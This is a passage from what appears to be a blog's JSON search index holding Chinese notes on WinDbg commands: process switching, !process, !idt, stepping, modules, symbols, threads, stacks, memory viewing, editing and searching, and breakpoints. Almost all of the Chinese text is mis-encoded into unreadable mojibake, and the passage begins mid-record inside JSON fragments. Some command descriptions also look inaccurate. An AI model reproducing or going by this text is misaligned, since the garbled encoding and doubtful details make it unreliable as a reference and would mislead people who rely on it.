åˆ‡æ¢è¿›ç¨‹ åœ¨WinDbgä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ‡æ¢è¿›ç¨‹ï¼š | å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢å½“å‰æ´»åŠ¨è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œ|1så°†åˆ‡æ¢åˆ°è¿›ç¨‹IDä¸º1çš„è¿›ç¨‹ã€‚ ~* å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢åˆ°æ‰€æœ‰è¿›ç¨‹ä¸­çš„ä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚ ~[] å‘½ä»¤ï¼šç”¨äºåˆ‡æ¢åˆ°ç‰¹å®šç´¢å¼•çš„è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œ~[3]så°†åˆ‡æ¢åˆ°ç´¢å¼•ä¸º3çš„è¿›ç¨‹ã€‚ è¯·æ³¨æ„ï¼Œä½¿ç”¨è¿™äº›å‘½ä»¤æ—¶ï¼Œè¦ç¡®ä¿å·²ç»åœ¨è°ƒè¯•ä¼šè¯ä¸­åŠ è½½äº†é€‚å½“çš„ç¬¦å·å’Œæºä»£ç ï¼Œå¹¶ä¸”å·²ç»æ‰“å¼€äº†éœ€è¦è°ƒè¯•çš„è¿›ç¨‹å’Œçº¿ç¨‹ã€‚ !process å‘½ä»¤ åœ¨Windows Debuggerï¼ˆWinDbgï¼‰ä¸­ï¼Œ!processå‘½ä»¤ç”¨äºæ˜¾ç¤ºæœ‰å…³ç‰¹å®šè¿›ç¨‹æˆ–æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬EPROCESSå—ã€‚ è¯¥å‘½ä»¤çš„è¯­æ³•éšWindowsç‰ˆæœ¬çš„ä¸åŒè€Œæœ‰æ‰€ä¸åŒã€‚ åœ¨Windows NT 4.0ä¸­ï¼Œå®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š 1!process[Process[Flags]] åœ¨Windows 2000ä¸­ï¼Œå®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š 1!process[/sSession] [Process[Flags]] åœ¨Windows XPåŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œå®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š 1!process[/sSession] [/mModule] [Process[Flags]] ä»¥ä¸Šå‘½ä»¤ä¸­çš„å‚æ•°å«ä¹‰å¦‚ä¸‹ï¼š /sSessionï¼ˆWindows 2000åŠä¹‹åï¼‰æŒ‡å®šæ‹¥æœ‰ç»™å®šè¿›ç¨‹çš„ä¼šè¯ï¼ˆsessionï¼‰ã€‚ /mModuleï¼ˆWindows XPåŠä¹‹åï¼‰æŒ‡å®šæ‹¥æœ‰éœ€è¦çš„è¿›ç¨‹çš„æ¨¡å—ã€‚ Process æŒ‡å®šç›®æ ‡æœºä¸ŠæŸä¸ªè¿›ç¨‹çš„16è¿›åˆ¶åœ°å€æˆ–è€…è¿›ç¨‹IDã€‚ Flags æ˜¯ç”¨äºæ§åˆ¶å‘½ä»¤è¡Œä¸ºçš„æ ‡å¿—ä½ï¼Œä¾‹å¦‚ï¼Œ/d ç”¨äºæ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹ç¯å¢ƒå—ï¼Œ/c ç”¨äºæ˜¾ç¤ºå®Œæ•´çš„çº¿ç¨‹ç¯å¢ƒå—ç­‰ã€‚ ä»¥ä¸Šä¿¡æ¯ä»…ä¾›å‚è€ƒï¼Œå¦‚éœ€æ›´å¤šä¿¡æ¯ï¼Œå»ºè®®å’¨è¯¢ä¸“ä¸šçš„æŠ€æœ¯äººå‘˜ã€‚ !IDT åœ¨WinDbgä¸­ï¼Œ!idtå‘½ä»¤ç”¨äºæ˜¾ç¤ºä¸­æ–­åˆ†é…è¡¨ï¼ˆInterrupt Dispatch Tableï¼Œç®€ç§°IDTï¼‰ä¸­çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹ï¼ˆInterrupt Service Routineï¼Œç®€ç§°ISRï¼‰ã€‚ è¯¥å‘½ä»¤çš„è¯­æ³•ä¸ºï¼š!idt [IDT]ï¼Œå…¶ä¸­IDTæ˜¯å¯é€‰é¡¹ï¼Œç”¨äºæŒ‡å®šè¦æ˜¾ç¤ºçš„ç‰¹å®šIDTã€‚ å¦‚æœæœªæŒ‡å®šIDTï¼Œå¹¶ä¸”åœ¨æ²¡æœ‰æŒ‡å®š-aé€‰é¡¹çš„æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤å°†ç®€çŸ­åœ°æ˜¾ç¤ºç›®æ ‡æœºä¸Šæ‰€æœ‰å¤„ç†å™¨çš„IDTã€‚ å¦‚æœæŒ‡å®šäº†-aé€‰é¡¹ï¼Œè¯¥å‘½ä»¤å°†æ˜¾ç¤ºæ‰€æœ‰IDTçš„ISRã€‚ å¦‚æœéœ€è¦è·å–è¯¥å‘½ä»¤çš„å¸®åŠ©æ–‡æœ¬ï¼Œå¯ä»¥åœ¨è°ƒè¯•å™¨å‘½ä»¤çª—å£ä¸­ä½¿ç”¨!idt -?å‘½ä»¤ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥å‘½ä»¤åªèƒ½å¯¹x64æˆ–è€…x86ç›®æ ‡æœºä½¿ç”¨ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘Windbg åŸºç¡€å‘½ä»¤","date":"2024-08-31T01:41:20.245Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘WindbgåŸºç¡€å‘½ä»¤/","text":"æ¦‚è¿°ï¼šè®°å½• windbg è°ƒè¯•ä¸­çš„ä¸€äº›åŸºç¡€å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥è¯¢ï¼ŒWinDbg Preview ç‰ˆæœ¬è‡ªå¸¦äº† Local Help æ‰‹å†Œï¼Œå¯ä»¥ä½¿ç”¨è‡ªå¸¦çš„ã€‚ åŸºç¡€å‘½ä»¤ è¯´æ˜ å‘½ä»¤ ç”¨æ³• æè¿° è¯´æ˜ å‘½ä»¤ ç”¨æ³• æè¿° å¸®åŠ© ? ?? è¡¨è¾¾å¼ æ˜¾ç¤ºå¸¸è§„å‘½ä»¤è®¡ç®—è¡¨è¾¾å¼çš„å€¼ .help .help æ˜¾ç¤ºå…ƒå‘½ä»¤(ä»¥ . å¼€å¤´çš„å‘½ä»¤) .hh .hh.hh bp æ‰“å¼€windbg helpæ–‡æ¡£æ‰“å¼€windbg helpæ–‡æ¡£ï¼Œå¹¶è‡ªåŠ¨è¾“å…¥bpå‘½ä»¤è¿›è¡Œæœç´¢ ç‰ˆæœ¬ version æ˜¾ç¤ºè°ƒè¯•å™¨å’Œè°ƒè¯•ç›®æ ‡ç‰ˆæœ¬ vercommand æ˜¾ç¤ºè°ƒè¯•å™¨å¯åŠ¨æ—¶çš„å‘½ä»¤è¡Œ vertarget æ˜¾ç¤ºè°ƒè¯•ç›®æ ‡ç³»ç»Ÿä¿¡æ¯ æ¸…ç©ºå±å¹• .cls æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯ .ecxr æ˜¾ç¤ºå¼‚å¸¸ä¿¡æ¯çš„ä¸Šä¸‹æ–‡ .lastevent æ˜¾ç¤ºæœ€è¿‘ä¸€æ¬¡å‘ç”Ÿçš„å¼‚å¸¸ä¿¡æ¯æˆ–äº‹ä»¶ .exr -1 æ˜¾ç¤ºæœ€è¿‘ä¸€æ¬¡çš„å¼‚å¸¸è®°å½• !analyze !analyze -v!analyze -hang!analyze -f æ˜¾ç¤ºå½“å‰å¼‚å¸¸ä¿¡æ¯åˆ†æçº¿ç¨‹æ ˆï¼Œçœ‹æ˜¯å¦æœ‰çº¿ç¨‹blockingå…¶ä»–çº¿ç¨‹See an exception analysis even when the debugger does not detect an exception. å¯„å­˜å™¨ r æ˜¾ç¤ºå„å¯„å­˜å™¨çš„å€¼ æ—¶é—´ .time æ˜¾ç¤ºsystem/process/kernel/user time Switch between 32-bit and 64-bit mode !wow64exts.sw.load wow64exts æŸ¥çœ‹64ä½æœºå™¨ä¸Šç”Ÿæˆçš„32ä½ç¨‹åºçš„dmpæ—¶ï¼Œéœ€è¦ä½¿ç”¨æ­¤å‘½ä»¤è½¬æ¢ä¸€ä¸‹æ¨¡å¼!wow64exts.help å¯æŸ¥çœ‹ç›¸å…³å¸®åŠ©ä¿¡æ¯ è°ƒè¯•å‘½ä»¤ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ g ç»§ç»­æ‰§è¡Œ gu æ‰§è¡Œåˆ°å½“å‰å‡½æ•°è¿”å› step out p å•æ­¥è°ƒè¯• step over t step into q ç»“æŸè°ƒè¯•ä¼šè¯/é€€å‡º .restart é‡æ–°å¯åŠ¨è°ƒè¯•ç›®æ ‡ .detach åˆ†ç¦»è°ƒè¯•ç›®æ ‡ .attach é™„åŠ åˆ°å­˜åœ¨çš„è¿›ç¨‹ï¼Œå‚æ•°ä¸º16è¿›åˆ¶çš„PID .attach 0x123 .create åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿›è¡Œè°ƒè¯• ä¾‹å¦‚è°ƒè¯•cmd.exe.create cmd .dbgdbg å¯åŠ¨å¦ä¸€ä¸ªè°ƒè¯•å™¨æ¥è°ƒè¯•å½“å‰è°ƒè¯•å™¨ .opendump æ‰“å¼€dmpæ–‡ä»¶ .opendump d:\\dump\\360tray.dmp æ¨¡å—ä¿¡æ¯ å‘½ä»¤ è¯´æ˜ lm æ˜¾ç¤ºåŠ è½½çš„æ¨¡å—ä¿¡æ¯ï¼Œexeå’Œdllç­‰ lmvm æ¨¡å—ålm v m æ¨¡å—å æŸ¥çœ‹æŒ‡å®šæ¨¡å—è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚æŸ¥çœ‹360tray.exeä¸­åŠ è½½çš„appd.dllçš„ä¿¡æ¯ç¤ºä¾‹ï¼š lmvm appd è°ƒè¯•ç¬¦å· å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ ld åŠ è½½æ¨¡å—çš„è°ƒè¯•ç¬¦å· ld appdld * ln æœç´¢ç›¸é‚»ç¬¦å·ï¼ˆè·ç¦»æŒ‡å®šåœ°å€æœ€è¿‘çš„ç¬¦å·ï¼‰ ln 722d0000 x æ˜¾ç¤ºåŒ¹é…å‚æ•°ç±»å‹çš„ç¬¦å· æ˜¾ç¤ºkernel32.dllæ‰€æœ‰ä»¥Createå¼€å¤´çš„ç¬¦å·x kernel32!Create* .sympath è®¾ç½®ç¬¦å·æ–‡ä»¶è·¯å¾„ .sympath d:\\dump .symfix è®¾ç½®ç³»ç»Ÿç¬¦å·å­˜æ”¾ä½ç½® è®¾ç½®ç³»ç»Ÿç¬¦å·å­˜æ”¾ä½ç½® .reload Reload symbol information for all modules** è¿›ç¨‹ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ .process æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„EPROCESS !process EPROCESS æŸ¥çœ‹æŸä¸ªçº¿ç¨‹ !process 0 0 æŸ¥çœ‹ç³»ç»Ÿå½“å‰æ‰€æœ‰è¿›ç¨‹ çº¿ç¨‹ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ ~ æ˜¾ç¤ºæ‰€æœ‰çº¿ç¨‹ä¿¡æ¯ ~* [Command]~. [Command]~#[Command] ä¸ºæ‰€æœ‰çº¿ç¨‹æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ä¸ºå½“å‰çº¿ç¨‹æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ä¸ºå¯¼è‡´å½“å‰å¼‚å¸¸æˆ–è°ƒè¯•äº‹ä»¶çš„çº¿ç¨‹æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ æŸ¥çœ‹æ‰€æœ‰çº¿ç¨‹çš„æ ˆä¿¡æ¯ï¼š~* k Number Number s æ˜¾ç¤ºåºå·ä¸ºNumberçš„çº¿ç¨‹åˆ‡æ¢å½“å‰çº¿ç¨‹ä¸ºåºå·Numberçš„çº¿ç¨‹ æ˜¾ç¤º10å·çº¿ç¨‹ï¼š10åˆ‡æ¢åˆ°10å·çº¿ç¨‹ï¼š 10 s ~~[TID] çº¿ç¨‹IDä¸ºTIDçš„çº¿ç¨‹ ~ Number n~ Number m SuspendThread å¢åŠ çº¿ç¨‹çš„æŒ‚èµ·è®¡æ•°ResumeThread å‡å°‘çº¿ç¨‹çš„æŒ‚èµ·è®¡æ•° ~ 10 n~10 m ~ Number f~ Number u Freeze thread å†»ç»“çº¿ç¨‹Unfreeze thread è§£å†»çº¿ç¨‹æ§åˆ¶è¢«è°ƒè¯•çš„çº¿ç¨‹çš„å†»ç»“çŠ¶æ€, ä¸ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ç±»ä¼¼ï¼ˆå¤„äºå†»ç»“çŠ¶æ€æ—¶æ¢å¤ç›®æ ‡æ‰§è¡Œæ—¶è¿™ä¸ªçº¿ç¨‹ä¸ä¼šæ¢å¤æ‰§è¡Œï¼Œè¿™ä¸ªçŠ¶æ€æ˜¯è°ƒè¯•å™¨ç»´æŠ¤çš„ä¸€ä¸ªçŠ¶æ€ï¼Œæ‰§è¡Œ~ çº¿ç¨‹å· n å¢åŠ æŒ‚èµ·è®¡æ•°åï¼Œæ‰§è¡Œgè¿è¡Œæ—¶è¯¥çº¿ç¨‹ä¹Ÿä¸ä¼šè¿è¡Œï¼‰ ~ Number s åœ¨æ¢å¤æ‰§è¡Œå‘½ä»¤gå‰åŠ çº¿ç¨‹é™å®šç¬¦ï¼Œå¯ä»¥åªæ¢å¤æŒ‡å®šçš„çº¿ç¨‹æ‰§è¡Œï¼ˆåªå¯¹è¯¥çº¿ç¨‹è°ƒç”¨ResumeThreadä½¿å…¶æ¢å¤æ‰§è¡Œï¼Œå…¶ä»–çº¿ç¨‹ä»å¤„äºæŒ‚èµ·çŠ¶æ€ï¼‰ !runaway æ˜¾ç¤ºæ¯ä¸ªçº¿ç¨‹è¿è¡Œæ—¶é—´ï¼Œå¯ä»¥æ–¹ä¾¿æ‰¾åˆ°æ¶ˆè€—cpuæ—¶é—´é•¿çš„çº¿ç¨‹ .ttime display thread times (user + kernel mode) !gle!gle -all displays the last error value for the current thread -&gt;GetLastErrordisplays the last error value for all threads !error decodes and displays information about an error value.Specifies one of the following error codes:Win32WinsockNTSTATUSNetAPI æ ˆ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ k æ˜¾ç¤ºEBPï¼Œè¿”å›åœ°å€å’Œæºæ–‡ä»¶ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ç§æœ‰ç¬¦å·çš„è¯ï¼‰ kb æ˜¾ç¤ºEBPï¼Œè¿”å›åœ°å€ï¼Œå‡½æ•°å‚æ•°åŠæºæ–‡ä»¶ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ç§æœ‰ç¬¦å·çš„è¯ï¼‰ k L Lé€‰é¡¹è¡¨ç¤ºä¸æ˜¾ç¤ºæºæ–‡ä»¶ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨äºå…¶ä»–å‘½ä»¤æ¯”å¦‚ kb Lï¼Œ kv Læˆ–å†™ä¸º kLï¼ŒkbLï¼ŒkvL kv åœ¨kbçš„åŸºç¡€ä¸Šå¢åŠ æ˜¾ç¤ºFPOï¼ˆæ ˆæŒ‡é’ˆçœç•¥ï¼‰ä¿¡æ¯å’Œè°ƒç”¨åè®®ï¼ˆè°ƒç”¨åè®®ä»…æ”¯æŒOn x86-based processorsï¼‰ kpkP æ ¹æ®ç§æœ‰ç¬¦å·æ–‡ä»¶ä¸­çš„å‡½æ•°åŸå‹ä¿¡æ¯è‡ªåŠ¨æ˜¾ç¤ºå‚æ•°ä¿¡æ¯Pä¸ºå¤§å†™ï¼Œè¡¨ç¤ºæ¯ä¸ªå‚æ•°å ä¸€è¡Œ kn åœ¨kå‘½ä»¤çš„åŸºç¡€ä¸Šï¼Œæ¯è¡Œå‰æ˜¾ç¤ºæ ˆå¸§çš„åºå· kn f fé€‰é¡¹è¡¨ç¤ºæ˜¾ç¤ºæ¯ä¸¤ä¸ªç›¸é‚»æ ˆå¸§çš„å†…å­˜è·ç¦»ï¼Œå³æ ˆå¸§åŸºåœ°å€çš„å·®å€¼ æŸ¥çœ‹/ä¿®æ”¹/æœç´¢å†…å­˜æ•°æ® è¯´æ˜ å‘½ä»¤ æè¿° ç¤ºä¾‹ æŸ¥çœ‹å†…å­˜æ•°æ® å‘½ä»¤æ ¼å¼ï¼šd{a|b|c|d|D|f|p|q|u|w|W} [Options] [Range]dy{b|d} [Options] [Range]d [Options] [Range] da ASCIIå­—ç¬¦ RangeæŒ‡å®šè¦æ˜¾ç¤ºçš„å†…å­˜èŒƒå›´ï¼Œæœ‰å¦‚ä¸‹å‡ ç§è¡¨ç¤ºæ–¹æ³•ï¼šèµ·å§‹åœ°å€+ç»ˆæ­¢åœ°å€æ¯”å¦‚ï¼šdd 0012fd9c 0012fda8èµ·å§‹åœ°å€+L/l+å…ƒç´ ä¸ªæ•°æ¯”å¦‚ï¼šdd 0012fd9c L4 æˆ– dd 0012fd9c l4ç»ˆæ­¢åœ°å€+L/l+è´Ÿå·+å…ƒç´ ä¸ªæ•°æ¯”å¦‚ï¼šdd 0012fda8 L-4 æˆ– dd 0012fda8 l-4 du Unicodeå­—ç¬¦ dc DWORDå’ŒASCIIç  dd DWORD dD åŒç²¾åº¦æµ®ç‚¹æ•° df å•ç²¾åº¦æµ®ç‚¹æ•° dp æŒ‡é’ˆ dq å››å­—/8å­—èŠ‚ dw ä¸€ä¸ªå­—/2å­—èŠ‚ æŸ¥çœ‹å±€éƒ¨å˜é‡dv [Flags] [Pattern] dv æŸ¥çœ‹å±€éƒ¨å˜é‡ dv 02sample!gGlo*dvå‘½ä»¤å¯ä»¥å¸¦æœ‰é€šé…ç¬¦, æ¥æŸ¥çœ‹å…·æœ‰æŸå‘½åæ¨¡å¼çš„å˜é‡. dv /i æŸ¥çœ‹å±€éƒ¨å˜é‡, å¹¶æ˜¾ç¤ºç¬¦å·çš„ç±»å‹å’Œå‚æ•°ç±»å‹. dv /t æŸ¥çœ‹å±€éƒ¨å˜é‡, å¹¶æ˜¾ç¤ºæ¯ä¸ªå±€éƒ¨å˜é‡çš„æ•°æ®ç±»å‹ dv /V æŸ¥çœ‹å±€éƒ¨å˜é‡, å¹¶æ˜¾ç¤ºå˜é‡çš„å­˜å‚¨ä½ç½® dv /V VariableName æŸ¥çœ‹æŒ‡å®šåç§°çš„å˜é‡ æŸ¥çœ‹å¤åˆç±»å‹å˜é‡ dt Display Typeçš„ç¼©å†™. å½“å˜é‡çš„ç±»å‹ä¸ºå¤åˆç±»å‹, æ¯”å¦‚è¯´ç»“æ„ä½“æˆ–è€…ç±», é‚£ä¹ˆdvå‘½ä»¤åªä¼šæ˜¾ç¤ºå˜é‡çš„åœ°å€. dtå‘½ä»¤å¯ä»¥å°†ä¸€å—å†…å­˜æŒ‰ç…§æŸä¸ªæ•°æ®ç±»å‹æ¥è§£æ, å…¶ä¸­çš„æ•°æ®ç±»å‹éœ€è¦ä½œä¸ºå‚æ•°è¢«ä¼ é€’ç»™dtå‘½ä»¤.-bï¼šé€’å½’æ˜¾ç¤ºæ‰€æœ‰å­ç±»å‹-r ï¼šæŒ‡å®šæ˜¾ç¤ºæ·±åº¦ï¼Œ-r0è¡¨ç¤ºä¸æ˜¾ç¤ºå­ç±»å‹-yï¼šé™„åŠ æœç´¢é€‰é¡¹ï¼Œåªæ˜¾ç¤ºæŸä¸ªåŒ¹é…çš„å­—æ®µ ç¼–è¾‘å†…å­˜æ•°æ® æŒ‰å­—ç¬¦ä¸²æ–¹å¼ç¼–è¾‘å‘½ä»¤æ ¼å¼ï¼še{a|u|za|zu} Address â€œStringâ€ å…¶ä¸­aå’Œuåˆ†åˆ«ä»£è¡¨ä¸æ˜¯ä»¥0ç»“å°¾çš„ASCIIå’ŒUnicodeå­—ç¬¦ä¸²ï¼Œzaå’Œzuåˆ†åˆ«ä»£è¡¨ä»¥0ç»“å°¾çš„ASCIIå’ŒUnicodeå­—ç¬¦ä¸² ezu 12fc94 â€œDebugâ€ ä¿®æ”¹0012fc94åœ°å€çš„å†…å®¹ä¸ºUnicodeå­—ç¬¦ä¸²&quot;Debug&quot; æŒ‰æ•°å€¼æ–¹å¼ç¼–è¾‘å‘½ä»¤æ ¼å¼ï¼še{b|d|D|f|p|q|w} Address [Values] ValuesæŒ‡å®šæ–°çš„å€¼ï¼Œå¦‚æœå‘½ä»¤ä¸­æ²¡æœ‰æŒ‡å®šè¯¥å€¼ï¼Œåˆ™Windbgä¼šä»¥äº¤äº’å¼æ–¹å¼è®©ç”¨æˆ·è¾“å…¥ ew 12fc94 41 41 41 41 41 å°†0012fc94åœ°å€å¼€å§‹çš„5ä¸ªWORDéƒ½æ”¹ä¸º0x41 æœç´¢å†…å­˜æ•°æ® æŒ‡å®šèŒƒå›´æœç´¢ä»»ä½•ANSIIæˆ–UNICODEå­—ç¬¦ä¸²å‘½ä»¤æ ¼å¼ï¼šs -[[Flags]] sa|su Range [Flags]ç”¨æ¥æŒ‡å®šæœç´¢é€‰é¡¹ï¼šL/l+æ•´æ•° æŒ‡å®šå­—ç¬¦ä¸²çš„æœ€å°é•¿åº¦s å°†æœç´¢ç»“æœä¿å­˜èµ·æ¥r åœ¨ä¿å­˜çš„ç»“æœä¸­æœç´¢ RangeæŒ‡å®šå†…å­˜èŒƒå›´ï¼Œå†™æ³•ä¸då‘½ä»¤çš„Rangeå‚æ•°ä¸€æ · s -[L5] sa poi(nt!PsInitialSystemProcess) L200åœ¨nt!PsInitialSystemProcesså˜é‡æ‰€æŒ‡åœ°å€å¼€å§‹çš„512å­—èŠ‚ï¼ˆ0x200ï¼‰èŒƒå›´å†…æœç´¢ä»»ä½•é•¿åº¦ä¸å°äº5çš„ANSIIå­—ç¬¦ä¸² æŒ‡å®šå†…å­˜åœ°å€èŒƒå›´å†…æœç´¢ä¸æŒ‡å®šå¯¹è±¡ç›¸åŒç±»å‹çš„å¯¹è±¡å‘½ä»¤æ ¼å¼ï¼šs -[[Flags]]v Range Object Object ï¼š Specifies the address of an object or the address of a pointer to an object æŒ‡å®šèŒƒå›´å†…æœç´¢æŸä¸€å†…å®¹æ¨¡å¼å‘½ä»¤æ ¼å¼ï¼šs -[[[Flags]Type]] Range Pattern TypeæŒ‡å®šè¦æœç´¢å†…å®¹çš„æ•°æ®ç±»å‹ï¼Œå³å†³å®šåŒ¹é…æœç´¢å†…å®¹çš„æ–¹å¼ã€‚å–å€¼å¯ä»¥ä¸ºï¼šbï¼ˆå­—èŠ‚ï¼‰ï¼Œwï¼ˆå­—ï¼‰ï¼Œdï¼ˆåŒå­—ï¼‰ï¼Œqï¼ˆå››å­—ï¼‰ï¼Œaï¼ˆASCIIå­—ç¬¦ä¸²ï¼‰ï¼Œuï¼ˆUnicodeå­—ç¬¦ä¸²ï¼‰ã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºbã€‚ PatternæŒ‡å®šè¦æœç´¢çš„å†…å®¹ s -u 0x400000 L2a000 â€œAdvDbg&quot;ä»0x400000å¼€å§‹çš„2a000èŒƒå›´å†…æœç´¢Unicodeå­—ç¬¦ä¸²&quot;AdvDbgâ€ åœ¨å½“å‰è¿›ç¨‹çš„æ‰€æœ‰æ¨¡å—ä¸­è¿›è¡Œæœç´¢!for_each_module s-a @#Base @#End â€œDebuggerâ€ åœ¨æ¯ä¸ªæ¨¡å—ä¸­æœç´¢å­—ç¬¦ä¸²&quot; Debugger&quot;å…¶ä¸­@#Baseå’Œ@#Endæ˜¯!for_each_moduleå®šä¹‰çš„åˆ«åï¼Œå…¶ä»–çš„è¿˜æœ‰ï¼š@#ModuleNameï¼ˆæ¨¡å—åç§°ï¼‰ï¼Œ@#SymbolFileNameï¼ˆç¬¦å·æ–‡ä»¶åç§°ï¼‰ï¼Œ@#Sizeï¼ˆæ¨¡å—å¤§å°ï¼‰ï¼Œ@#SymbolTypeï¼ˆç¬¦å·æ–‡ä»¶ç±»å‹ï¼‰ è®¾ç½®æ–­ç‚¹ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ bp è®¾ç½®æ–­ç‚¹å‘½ä»¤æ ¼å¼ï¼š bp[IDå·] [Options] [Address [ç¬¬å‡ æ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨]] [â€œä¸€ç»„å‘½ä»¤ï¼Œç”¨åˆ†å·éš”å¼€â€] Optionsé€‰é¡¹å¯ç”¨çš„å€¼ï¼š/1 æ–­ç‚¹è¢«å‘½ä¸­ä¸€æ¬¡åè‡ªåŠ¨åˆ é™¤ï¼Œå³ä¸€æ¬¡å‘½ä¸­æ–­ç‚¹/p åªç”¨äºå†…æ ¸è°ƒè¯•ä¸­ï¼Œ/påè·Ÿä¸€ä¸ªEPROCESSç»“æ„çš„åœ°å€ï¼Œå³å¯¹æŒ‡å®šçš„è¿›ç¨‹è®¾ç½®æ–­ç‚¹/t åªç”¨äºå†…æ ¸è°ƒè¯•ä¸­ï¼Œ/tåè·Ÿä¸€ä¸ªETHREADç»“æ„çš„åœ°å€ï¼Œå³å¯¹æŒ‡å®šçš„çº¿ç¨‹è®¾ç½®æ–­ç‚¹/c å’Œ /C æŒ‡å®šä¸­æ–­ç»™ç”¨æˆ·çš„æœ€å¤§å‡½æ•°è°ƒç”¨æ·±åº¦å’Œæœ€å°å‡½æ•°è°ƒç”¨æ·±åº¦ä¸¾ä¾‹ï¼šbp /c5 MSVCR80D!printf åªæœ‰å½“å‡½æ•°è°ƒç”¨æ ˆæ·±åº¦æµ…äº5æ—¶æ‰ä¸­æ–­ã€‚ Addressè¡¨è¾¾æ–¹å¼ï¼šä½¿ç”¨æ¨¡å—ååŠ å‡½æ•°ç¬¦å·ï¼šbp LocalVar!FuncC æˆ–å¸¦åç§»å€¼ bp LocalVar!FuncC+9ç›´æ¥ä½¿ç”¨å†…å­˜åœ°å€ï¼šbp 00401089å¦‚æœä½¿ç”¨å®Œå…¨çš„è°ƒè¯•ç¬¦å·ï¼Œè°ƒè¯•ç¬¦å·ä¸­åŒ…å«æºä»£ç è¡Œä¿¡æ¯ï¼Œå¯ä»¥ç”¨ï¼š bpï½€æ¨¡å—å!XXX.cpp:è¡Œå·ï½€ ï¼Œ å…¶ä¸­ï½€ä¸ºé‡éŸ³ç¬¦å·å¯¹äºC++çš„ç±»æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ç±»ååŒå†’å·(::)æˆ–åŒä¸‹åˆ’çº¿(__)æ¥è¿æ¥ç±»åå’Œæ–¹æ³•åï¼š bp MyClass::MyMethod æˆ– bp MyClass__MyMethod æˆ– bp @@(MyClass::MyMethod) ï¼ˆ1ï¼‰bp LocalVar!FuncC+9 å…¶ä¸­ LocalVarä¸ºæ¨¡å—åç§°ï¼ŒFuncCä¸ºå‡½æ•°åç§°ï¼Œ9ä¸ºåç§» ï¼ˆ2ï¼‰bp 00401089 åœ¨æŒ‡å®šçš„åœ°å€ä¸Šä¸‹æ–­ç‚¹ ï¼ˆ3ï¼‰bp MSVCR80D!printf + 3 2 â€œkv; da poi(ebp+8)â€ åœ¨printfçš„å…¥å£åç§»3çš„åœ°å€å¤„ä¸‹æ–­ç‚¹(ä¸ºäº†è®©å»ºç«‹æ ˆå¸§çš„ä»£ç æ‰§è¡Œå®Œ)ï¼Œå½“ç¬¬2æ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨ï¼Œå¹¶è‡ªåŠ¨æ‰§è¡Œkvå’Œda poi(ebp+8)å‘½ä»¤ã€‚ å…¶ä¸­ï¼Œda poi(ebp+8)ç”¨æ¥æ˜¾ç¤ºprintfçš„ç¬¬ä¸€ä¸ªå‚æ•°æ‰€æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚ bu ç”¨äºå¯¹å°šæœªè¢«åŠ è½½æ¨¡å—ä¸­çš„ä»£ç è®¾ç½®æ–­ç‚¹å‘½ä»¤æ ¼å¼ï¼š bu[IDå·] [Options] [Address [ç¬¬å‡ æ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨]] [â€œä¸€ç»„å‘½ä»¤ï¼Œç”¨åˆ†å·éš”å¼€â€] å¯¹äºè°ƒè¯•åŠ¨æ€åŠ è½½æ¨¡å—çš„å…¥å£å‡½æ•°å’Œåˆå§‹åŒ–ä»£ç 